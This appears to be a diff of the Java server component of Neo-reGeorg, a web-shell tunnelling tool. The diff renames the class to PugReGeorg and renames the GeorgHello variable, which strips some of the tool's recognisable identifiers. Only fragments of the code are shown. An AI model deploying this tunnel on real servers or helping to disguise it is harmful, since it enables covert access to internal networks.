@@ -11,10 +11,10 @@ import javax.net.ssl.*;
 /**
  * @Modifier c0ny1, L, BeichenDream
  * @CreateDate 2021-08-17
- * @Description 将 Neo-reGeorg jsp 服务端改为 java 代码，提高兼容性
+ * @Description 将 Pug-reGeorg jsp 服务端改为 java 代码，提高兼容性
  */
 
-public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
+public class PugReGeorg implements HostnameVerifier, X509TrustManager {
     private char[] en;
     private byte[] de;
 
@@ -32,7 +32,7 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
             int HTTPCODE      = (Integer) args[4];
             int READBUF       = (Integer) args[5];
             int MAXREADSIZE   = (Integer) args[6];
-            String GeorgHello = (String)  args[7];
+            String EndpointMsg = (String)  args[7];
             int BLV_L_OFFSET  = (Integer) args[8];
 
             int USE_REQUEST_TEMPLATE = (Integer) args[9];
@@ -80,7 +80,7 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
                     info = blv_decode(data, BLV_L_OFFSET);
                 }
             } catch ( Exception e) {
-                // out.write(new String(b64de(GeorgHello)));
+                // out.write(new String(b64de(EndpointMsg)));
                 out.write(e.toString());
                 out.flush();
                 out.close();
@@ -247,7 +247,7 @@ public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
                 out.flush();
                 out.close();
             } else {
-                out.write(new String(b64de(GeorgHello)));
+                out.write(new String(b64de(EndpointMsg)));
                 out.flush();
                 out.close();
             }
